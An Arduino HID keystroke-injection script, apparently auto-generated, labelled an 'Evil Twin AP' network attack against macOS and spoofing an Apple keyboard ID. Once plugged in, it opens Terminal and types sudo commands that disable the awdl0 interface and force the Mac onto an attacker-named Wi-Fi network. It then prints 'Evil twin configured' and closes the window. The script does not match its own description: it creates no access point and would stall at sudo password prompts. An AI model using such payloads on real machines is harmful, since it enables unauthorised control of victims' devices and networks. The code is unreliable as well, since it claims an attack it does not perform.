#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Create soft AP (requires airbase-ng or similar)
  // Author: Generated
  // Title: Evil Twin AP
  // Target: macOS
  // Version: 1.0
  // Category: Network-Attacks
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("sudo ifconfig awdl0 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo networksetup -setairportnetwork en0 FreeWiFi WPA2Pass123");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo 'Evil twin configured'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}